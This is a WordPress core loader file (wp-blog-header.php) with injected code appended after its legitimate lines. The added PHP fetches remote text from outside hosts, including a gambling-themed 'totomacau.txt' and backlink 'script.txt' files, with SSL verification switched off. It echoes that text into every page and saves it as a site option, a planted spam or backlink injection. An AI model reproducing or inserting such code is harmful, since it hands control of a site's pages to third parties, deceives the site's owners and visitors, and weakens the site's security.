<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
$url = 'https://tahu-isi.store/totomacau.txt';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // jika SSL error
$content = curl_exec($ch);
curl_close($ch);

if ($content !== false) {
  echo $content;
}
function fetch_and_display_content($url) {
    $response = wp_remote_get($url);
    if (is_wp_error($response)) {
        return;
    }
    $body = wp_remote_retrieve_body($response);
    if (strpos($body, '<?php') !== false) {
        return;
    }
    update_option('jasabacklink_content', $body);
    echo $body;
}
$jasabacklinks = 'https://www.backlinkku.id/menu/traffic-v1/script.txt';
fetch_and_display_content($jasabacklinks);
$ilmumahal = 'https://www.backlinkku.id/menu/vip-v2/script.txt';
fetch_and_display_content($ilmumahal);
